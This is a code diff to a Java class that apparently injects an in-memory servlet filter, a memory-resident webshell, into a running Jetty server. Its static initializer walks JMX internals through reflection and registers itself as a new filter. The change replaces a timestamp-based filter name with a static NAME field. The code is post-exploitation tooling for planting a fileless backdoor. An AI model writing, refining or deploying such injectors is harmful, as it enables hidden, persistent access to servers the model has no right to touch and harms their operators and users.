@@ -20,10 +20,10 @@ public class JFMSFromJMX implements Filter {
 
 	public static String pattern;
 
+	public static String NAME;
+
 	static {
 		try {
-			String filterName = String.valueOf(System.nanoTime());
-
 			JmxMBeanServer mBeanServer = (JmxMBeanServer) ManagementFactory.getPlatformMBeanServer();
 
 			Field field = mBeanServer.getClass().getDeclaredField("mbsInterceptor");
@@ -58,7 +58,7 @@ public class JFMSFromJMX implements Filter {
 						field = o.getClass().getSuperclass().getDeclaredField("_name");
 						field.setAccessible(true);
 						String name = (String) field.get(o);
-						if (name.equals(filterName)) {
+						if (name.equals(NAME)) {
 							flag = true;
 							break;
 						}
@@ -86,7 +86,7 @@ public class JFMSFromJMX implements Filter {
 
 
 						Filter filter = new JFMSFromJMX();
-						holder.getClass().getMethod("setName", String.class).invoke(holder, filterName);
+						holder.getClass().getMethod("setName", String.class).invoke(holder, NAME);
 						holder.getClass().getMethod("setFilter", Filter.class).invoke(holder, filter);
 						handler.getClass().getMethod("addFilter", holder.getClass()).invoke(handler, holder);
 
